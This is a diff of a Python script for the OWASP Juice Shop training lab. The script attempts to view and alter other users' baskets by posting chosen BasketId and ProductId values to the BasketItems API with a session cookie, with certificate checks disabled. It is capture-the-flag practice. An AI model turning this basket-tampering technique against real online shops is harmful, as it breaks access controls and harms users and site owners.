@@ -1,7 +1,7 @@
 """
 This file is used to solve the OWASP Juice-shop Task
 VIEW BASKET
-MANIPULATE BASKET
+# MANIPULATE BASKET   ----> Not solved
 GOAL: to view or manipulate on other people's basket
 METHODOLOGY:
 step1. login using user A's cookies and headers
@@ -70,20 +70,23 @@ class manipulate_basket(a.attack_inter):
             count += 1
         return pId
 
-    def addto_basket(self,quantity):
+    def addto_basket(self, quantity):
         print('---------------------------------------------------')
         #print("Let us add to basket ID {} ----------------".format(self.victimBid))
         try:
             productId = self.generate_productID(self.basketId)
             print("we will add product Id {} ".format(productId))
-            data = [('contract','lalala'),('contract','lololo')]
-            data_byte = parse.urlencode(data).encode("utf-8")
-            print(data_byte)
+            json = {
+                "ProductId": productId,
+                "BasketId": self.basketId,
+                #"BasketId": "15",
+                "quantity": quantity
+            }
             url =a.URL + '/api/BasketItems/'
-            response = self.juice_session.post(url, cookies=self.cookie, headers=self.header,data = data
+            response = self.juice_session.post(url, cookies=self.cookie, headers=self.header, json = json
                                                , verify= False)
             print(response.text)
-            #self.view_basket(self.victimBid)
+            self.view_basket(self.basketId)
         except:
             print("2")
 
